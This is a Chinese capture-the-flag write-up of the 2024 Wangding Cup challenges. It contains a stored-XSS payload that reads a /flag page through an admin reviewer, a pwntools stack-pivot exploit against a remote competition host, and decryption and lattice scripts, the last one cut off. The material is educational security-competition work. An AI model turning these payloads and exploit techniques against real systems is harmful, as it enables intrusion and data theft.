---
title: 2024第四届“网鼎杯”青龙组 writeup
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511148&idx=1&sn=363b4f724a8c5173541bd563c4ca6910&chksm=e89d84b4dfea0da2ab496c97029709f8124bef9abe437dedd4d27cae012602831659ad905783&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-11-01
fetch_date: 2025-10-06T19:17:52.712883
---

# 2024第四届“网鼎杯”青龙组 writeup

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm9QzhEQ8ibpFH4c3lLwvQXtmfAIIcJeZ4REusQicj48vJpUlxA5U4wfVQ/0?wx_fmt=jpeg)

# 2024第四届“网鼎杯”青龙组 writeup

原创

DLNU Rweb

ChaMd5安全团队

## WEB

### WEB02：

访问该环境，登陆注册能随便登，会返回一个/content/hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmTEeUN1CSjkOUlDPAFFoH6Xfs5aMYDGGcvsAkz7iaRNv264E7znpgLSw/640?wx_fmt=png&from=appmsg)

img

进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmG5XGoY9GaAEjlDEcdKH23fnDPPXJHE6kYchYQUFyMw3doLLbfG0Kxw/640?wx_fmt=png&from=appmsg)

img

之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmvDjb6uREribBHIDyv5pq27qBRBPpTT7r1ib9Esgwe3bgD3ppcPryadgQ/640?wx_fmt=png&from=appmsg)

img

之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm58Fh0q1dC6PNcSlyJT0kgMy541ibErzvdJhMUiajCAw3XCVOpxdXeFeA/640?wx_fmt=png&from=appmsg)

img

所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmlSuSibicwZwvTmyUIZhAkQ2FibuLglzmTgFg24ibhgZgoGbtVeGsoQhZ8g/640?wx_fmt=png&from=appmsg)

img

```
<script>

  fetch('/flag').then(response => response.text()).then(data => {
    fetch('/content/2f9f1f36782a270b689d8c0f3e9e08df',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:"content=123"%2bdata
    })
  })
  </script>
```

## PWN

### PWN02

首先是一个login的登录绕过，直接按照它的要求输就好了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm3mwEgtcfJ35Mn9hpKCxRPGYdhvNL51JUePF5pCo3tiaAQ7rtCCMmWvA/640?wx_fmt=png&from=appmsg)

img

然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmk6iccT2tSu5cNyOWC1Cptj1wMDhibmzTic43X4bDZCczicNsYJhzND49BA/640?wx_fmt=png&from=appmsg)

img

然后看到有给出完整后门，那么就好打了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmMNgRdeyPSASBgPR1Wyiaq5PIhSXTxUDK3G31oRg5cQvr4uOMv5OyWGA/640?wx_fmt=png&from=appmsg)

img

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmtXjZRNObIsibzyv5sGG57Hg74lpxlkIXCSZLricHLguJl2Gb90XxWVsA/640?wx_fmt=png&from=appmsg)

img

直接栈迁移打system

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmVbQM7WjdMhNpLvXjlYOyV0tLvWcTs26aItWZbXc0j9B3vGJh0ocyRQ/640?wx_fmt=png&from=appmsg)

img

```
from pwn import *
context(os='linux',arch='i386',log_level='debug')
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#io=process("./pwn")
io=remote("0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn",44958)
sh_address=0x0804A038
ret_address=0x08048674
io.recvuntil("Enter your username: ")
io.sendline(b'admin\x00')
io.recvuntil("Enter your password: ")
io.sendline(b'admin123\x00')

io.recvuntil(b"0x")
stac = int(io.recv(8),16)
print(hex(stac))

payload = (p32(0x080485E6)+p32(0)+p32(sh_address)).ljust(80,b"\x00")+p32(stac-4)+p32(ret_address)

io.sendlineafter("plz input your msg:\n",payload)
io.interactive()
```

## REVERSE

### REVERSE01

安卓题，有混淆，先找MainActivity，锁定主要逻辑如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm6swZS27xX5iarTAgAcwOBxiafxaPSuYDTpzVzf98Nia0UIx0CVAwFicdpg/640?wx_fmt=png&from=appmsg)

img

主要就是跟其中的check方法，发现是native层加密逻辑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmvtZ8s41bar0098DFeqsaoeicNJwvfbPdsoMoopANawGJRribmAQkAmSg/640?wx_fmt=png&from=appmsg)

img

那么直接解包apk去看逻辑，逻辑也相对清晰，主要加密逻辑有点眼熟，过一下gpt得知确实是sm4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmPb9On6quh0HSV9VzQVsdXj60X0zaQHfZ6Kh59lHG8DvGmVZPlo9a4A/640?wx_fmt=png&from=appmsg)

img

那么直接找key嗦一把试试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmZGQcu0XZdKSJeahsr7I7X9GbWsj5Rj17drAPqA2OSlBiaaSDcGQ3TxA/640?wx_fmt=png&from=appmsg)

img

注意后面的这个Z0099864的赋值有个端序问题，做一个倒序就好

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmH6ugc6ZphLjXwicmhSibkZed37NNmgyljQv2muMUZUGINl2YtmyWnaoQ/640?wx_fmt=png&from=appmsg)

img

```
data="Z0099864"
print(data[::-1])
#4689900Z
```

拼接起来之后把密文提取出来直接解SM4，跟进变量提取密文

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmiam3mzqGAicwg2PaibvCNELcgiayVj0c3ib18QyQJqq8Nz1oRDZKVBqansA/640?wx_fmt=png&from=appmsg)

img

最终解出flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmgZTV4ia3anCc6tYwXic5iaV1zUCUyopLVwGoDIxksqeVZkovWBomgay2A/640?wx_fmt=png&from=appmsg)

img

### REVERSE02

逻辑什么的都相当清楚了，然后结合题目给的信息，顾名思义四段加密

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm3JChqxLZtSGdeCrKludfpclQtAA5Quxh66UxeUFOheQ9hNCdz37Dibw/640?wx_fmt=png&from=appmsg)

img

第一段是乘以2

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmnWjnntvg3IGVfr6GU717MAQ3Mt05Wb4rKhb8mmeQTgPGphTxOiclBlQ/640?wx_fmt=png&from=appmsg)

img

第二段是异或

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmGQUBPWib3Gich1dujVDWibtHCqKeMiaL04BvcyW38GdB9vNNRAnhtTdQDA/640?wx_fmt=png&from=appmsg)

img

第三段是自定义码表的一个base64

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm0iaH8UFptOgibwWUHWpYficVPCgyc9gVvQiazMULhDk3ibUI9a4CPUJ0kcg/640?wx_fmt=png&from=appmsg)

img

第四段是解一个AES

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmxLbuJ1VOb34RjcMtAnQjZ9ykwM61iblYJibtibo9JvGtcx2CDW1x1ZSqg/640?wx_fmt=png&from=appmsg)

img

**EXP：**

其中第三段解base64的结果为

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJmuGRUjm4lBiaFJDqc1Ey2DG30rcQ9VkGSxpH4gQibteg5ss51c3zsGGibw/640?wx_fmt=png&from=appmsg)

img

```
s2=[0x70,0xCC,0x62,0xCA,0x60,0x6E,0x6C,0x6C]
print("part1:",end='')
for i in range(len(s2)):
    print(chr(round(s2[i]/2)),end='')
# #part1:81fe0766

data=[0x69,0x56,0x45,0x17,0x7D,0x0D,0x11,0x52]
xor_key="XorrLord"
print("\npart2:",end='')
for i in range(len(xor_key)):
    print(chr(data[i]^ord(xor_key[i])),end='')
#part2:197e1bc6

#part3:809832f4

from Crypto.Cipher import AES

key = b"AesMasterAesMast"
cipher = AES.new(key, AES.MODE_ECB)

v4 = bytes([251, 217, 179, 171, 217, 136, 230, 11, 147, 124, 149, 235, 148, 219, 11, 84])

# 使用 AES ECB 模式解密 v4
decrypted_data = cipher.decrypt(v4)

print("\npart4:", decrypted_data)

#par4:d346fe66
```

拼接起来得到最终的flag为`wdflag{81fe0766197e1bc6809832f4d346fe66}`

## CRYPTO

### CRYPTO01

直接上网搜索，找到原题

https://www.cnblogs.com/mumuhhh/p/17789591.html

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm9P41PicicopehepNHAMygFqyl9l8ccWYRU2TyVhw5bx7LicmWu4JJibkcQ/640?wx_fmt=png&from=appmsg)

img

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBT0eJS3HaOtHUwy4iavkNgJm8qSOyxDryGUk0VFOiasEgf0SIup71frvUQCtWP0tAkyGMtMuvdXBk4Q/640?wx_fmt=png&from=appmsg)

img

根据给出的脚本进行解密

```
import time
time.clock = time.time

debug = True

strict = False

helpful_only = True
dimension_min = 7 # 如果晶格达到该尺寸，则停止移除
# 显示有用矢量的统计数据
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1

    print (nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# 显示带有 0 和 X 的矩阵
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        #print (a)

# 尝试删除无用的向量
# 从当前 = n-1（最后一个向量）开始
def remove_unhelpful(BB, monomials, bound, current):
    # 我们从当前 = n-1（最后一个向量）开始
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # 开始从后面检查
    for ii in range(current, -1, -1):
        #  如果它没有用
        if BB[ii, ii] >= bound:
            affe...